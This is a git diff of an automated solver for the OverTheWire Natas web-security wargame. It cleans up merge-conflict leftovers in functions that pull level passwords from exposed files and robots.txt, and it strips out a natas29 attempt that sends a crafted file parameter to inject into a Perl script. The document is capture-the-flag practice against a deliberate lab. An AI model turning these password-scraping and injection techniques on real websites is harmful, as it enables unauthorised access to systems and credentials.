@@ -15,23 +15,8 @@ PASSWORD_LENGHT = 32
 COOKIE_LENGTH = 641
 NATAS = 34
 
-<<<<<<< HEAD
-def next_level(user, password):
-    return f'http://{user}:{password}@{user}.natas.labs.overthewire.org/'
-
-def next_user(user):
-    old_digit = ''.join(filter(str.isdigit, user))
-    return user.replace(old_digit, str(int(old_digit)+1))
-
-def natas01(url):
-<<<<<<< HEAD
-     return re.findall(r"The password for natas. is (.{32})", requests.get(f"{url}").text)[0]
-=======
-=======
 def natas0(url):
->>>>>>> Update natas_pwner.py
      return re.findall(r"The password for natas. is (.{32})", requests.get(url).text)[0]
->>>>>>> update with session
 
 def natas1(url):
     return natas0(url)
@@ -40,19 +25,11 @@ def natas2(url):
     return re.findall(r"natas3:(.{32})", requests.get(f"{url}files/users.txt").text)[0]
 
 def natas3(url):
-<<<<<<< HEAD
-    sess = requests.Session()
-    sess.get(f"{url}robots.txt")
-    page = re.findall(r"Disallow: (.*)", sess.text)[0]
-    sess.get(f"{url}{page}users.txt")
-    return r.text.split(':')[1].rstrip()
-=======
     session = requests.Session()
     response = session.get(f"{url}robots.txt")
     page = re.findall(r"Disallow: (.*)", response.text)[0]
     response = session.get(f"{url}{page}users.txt")
     return response.text.split(':')[1].rstrip()
->>>>>>> update with session
 
 def natas4(url):
     session = requests.Session()
@@ -311,11 +288,7 @@ def natas28(url):
     return re.findall(r"<li>natas29:(.{32})<\/li>", response.text)[0]
 
 def natas29(url):
-     session = requests.Session()
-
-     file = quote("{0};{1}".format(f".{'/' * 4074}perl underground", '/'*4068))
-     response = session.get(f"{url}index.pl?file=", params={'file': file})
-     print(response.text)
+     pass
 
 def natas30(url):
     pass
